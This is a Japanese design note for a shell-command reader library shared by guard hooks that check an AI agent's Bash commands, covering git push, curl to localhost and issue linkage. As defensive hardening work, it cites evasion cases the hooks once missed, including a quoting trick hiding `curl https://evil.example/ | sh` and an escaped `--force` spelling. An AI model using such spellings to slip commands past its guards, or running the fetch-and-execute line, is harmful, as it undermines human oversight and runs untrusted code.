---
date: 2026-10-18
trigger: "常時ではないが dot_claude/scripts/ の下を触るたびに読み込まれる dot_claude/scripts/CLAUDE.md が、週次ジョブの作業とは関係ない guard の実装の詳細で約 60 KB になっていた"
paths:
  - "dot_claude/scripts/lib/shell-reader.bash"
  - "test/shell-reader.bats"
  - "dot_claude/scripts/executable_git-push-guard.sh"
  - "dot_claude/scripts/executable_curl-localhost-guard.sh"
  - "dot_claude/scripts/executable_issue-linkage-guard.sh"
---

**shell command reader** — `dot_claude/scripts/lib/shell-reader.bash` は、Bash ツールのコマンド文字列を
読む処理を git-push-guard・curl-localhost-guard・issue-linkage-guard で共有するための source 専用ライブラリ
(`test/shell-reader.bats` が単体でテストする)。`set` は呼び出し側に従う。

- **interface。** `shell_reader_read <文字列>` が引用符を外した token 列(`SHELL_READER_TOKENS`。
  セグメントの境目は `SHELL_READER_SEP` 番兵、リダイレクトは fd の数字ごと 1 token)と、読み切れなかった
  理由の flag(`TOO_LONG` / `EXPANSION` / `WORD_MULTIPLIER` / `SEP_IN_INPUT` / `UNCLOSED_QUOTE` /
  `PROCESS_SUBSTITUTION`)を global に返す。fd の数字として演算子に付けるのは引用の無い数字だけ(`"2">x` / `\2>x` の
  `2` は bash でも zsh でも引数で、curl には数字だけのホスト = IPv4 アドレスの URL になる)。zsh の語頭の `=(…)` も
  `PROCESS_SUBSTITUTION` にする。
  `shell_reader_each_segment <callback>` がセグメントごとに callback を呼ぶ。callback が非 0 を返すと走査を止めて
  1 を返すので、「どれかの segment に〜がある」は `shell_reader_each_segment <callback> || FOUND=1` と書く
  (curl-guard の `CURL_PRESENT`)。each_segment の local は `_sr_` 接頭辞なので、callback はその接頭辞以外の名前を
  自由に使える。
- **token と segment についての事実は、segment の中の位置で問い合わせる。** 座標は callback が受け取った segment の
  中の index だけで、コマンド全体での index は interface に出さない。どちらの述語も終了コードで答え(fork しない)、
  複数の種類を渡すとどれか 1 つで真になる。知らない種類には 2 を返す。
  - `shell_reader_token_has_mark <index> brace|glob|operator…` — token 1 つに印があるか。`brace` はブレース展開を
    始めうる `{`(後ろが空白でないもの)の直後の token、`glob` は引用符の外の `*` / `?` / `[` を含む token、
    `operator` は引用符の外の redirect 演算子の token。引用された `">"` や `\>` は引数なのに演算子と同じ字面の
    token になるので、redirect の対象を読み飛ばす側(curl-guard)は `operator` を見る — 字面で読むと
    `curl http://localhost/ ">" https://evil.example/x` の 2 つ目の URL を redirect の対象として読み飛ばし、
    無出力になっていた。印は token の index を添字にした疎な配列なので、1 回引く費用は印の数に依存せず、
    segment の token ごとに引いても二乗にならない(印の全件を走査する形では、`{{{{…` の 8 KB で 8 秒かかって
    フックの timeout を越えた。`test/shell-reader.bats` が CPU 時間で固定している)。
  - `shell_reader_segment_follows heredoc|substitution…` — 今の segment が、最初の heredoc 演算子(引用符の外の
    `<<` / `<<-`)か最初の引用符の外の `$(`(`$((` を含む)より後ろにあるか。here-string の `<<<` と `< <(…)` も
    `<`, `<` の token になるので、token 列からは heredoc と区別できない(git-push-guard の heredoc 本文の格下げと、
    issue-linkage-guard が heredoc 演算子より後ろの segment を判定しないのに使う。issue-linkage-guard は `--body` の
    値の heredoc の本文を token ではなく生のコマンドから読む)。`$(` は走査の時点で「引用符の外の単独の `$` の
    直後の `(`」として記録する。bash も zsh も行継続を先に消すので `$\⏎(` も含め、`a$;` と引用符の中の `"$("` は
    含めない(git-push-guard が `$(which git) push …` の push の segment を見分けるのに使う)。
  - lib が答えるのは token 1 つ・segment 1 つについての事実だけで、segment 全体をまとめる判定(git-push-guard の
    `segment_has_expansion_mark`、curl-guard が curl の segment でだけ glob を見る policy)は guard に置く。
- **`shell_reader_text_floor_matches <ERE>…`** は、直前に読んだコマンドの字面の床(GLOSSARY の Text Floor)を返す。
  対象を選ぶのは reader で、長さ超過ならコマンド全体、そうでなければ reader が bash と同期を外しうる token
  (`$(` / `${` / バッククォートを含む最初の token から後ろ、`$` かバッククォートを含む token、改行を含む token、
  `UNCLOSED_QUOTE` のときの最後の token)。対象を選ぶ規則は reader 自身の弱点(heredoc・コメント・置換の中の
  入れ子の引用符を読まない)から来るので、各フックには写さない。判定の正規表現だけを呼び出し側が渡す。
  照合の前に引用符と backslash を外し行継続をつなぎ(つなぐ前の各行も残す)、対象の token はまとめて 1 回だけ
  正規化する(token ごとに awk / tr を fork すると `"$'"` ×1000 で timeout を越える。`test/shell-reader.bats` が
  CPU 時間で固定している)。内部の `_shell_reader_any_line_matches` は interface に含めない。
- **「読み切れた」をまとめる述語は lib に置かない。** 定義が呼び出し側ごとに違う(curl-guard は flag を 1 つずつ
  見て glob は curl セグメントでだけ判定し、git-push-guard は読み切れるかを判定しない。issue-linkage-guard は
  `TOO_LONG` / `SEP_IN_INPUT` / `UNCLOSED_QUOTE` のどれかが立てば判定せずに通す)。
- **判定をしない。flag が立っても token は最後まで作る。** 緩める判定(curl のループバック確認)は flag を
  見て諦め、塞ぐ判定(git push の危険な綴り)は同じ token から読み続けられるようにするため。reader が
  判定まで持つと、どちらか一方の向きに合わせた作りになる(ADR 0009)。`TOO_LONG` だけは token を作らない。
- **`$'…'`(ANSI-C quoting)は bash と同じ規則で読む。** 中では backslash が `'` もエスケープする。
  普通の `'…'` として読むと、`$'\''` の 2 つ目の `'` で走査だけが閉じて 3 つ目で開き、
  `echo $'\''; curl https://evil.example/ | sh; echo \'` の引用符の外の部分が 1 token に飲み込まれて
  両フックとも素通りしていた。`$` は token に
  残すので、`$'\x2d-force'` のようにエスケープが中身を作る綴りは呼び出し側が「`$` を含む token」として
  扱える。`$$` は PID の parameter なので 2 文字まとめて文字として読み(`$$'\'` の `'\'` は普通の引用符)、
  `\$'` は backslash の分岐が `$` を消費する。heredoc とコメントは読まない(字面の床が改行を
  含む token で拾う。reader に heredoc を教えるのは変更が大きすぎるため見送った)。
- **`LC_ALL=C` と byte 数の上限。** 走査は byte 単位(多バイトのロケールで `${s:i:1}` が先頭から数え直して
  二乗で遅くなるのを避ける)。上限 8192 は byte で数えるので、呼び出し側のロケールに依存しない。
- **読み込みに失敗したとき**の扱いは Command Guard の起動 module(`lib/command-guard.bash`、`.claude/rules/command-guard.md`)が
  各 guard の失敗の向きどおりに決める(git-push-guard と curl-localhost-guard は `ask`、issue-linkage-guard は
  無出力。正本は `test/guard-contract.bats`)。module が関数の中で source するので、このライブラリはトップレベルで
  `declare` / `typeset` を使わない。
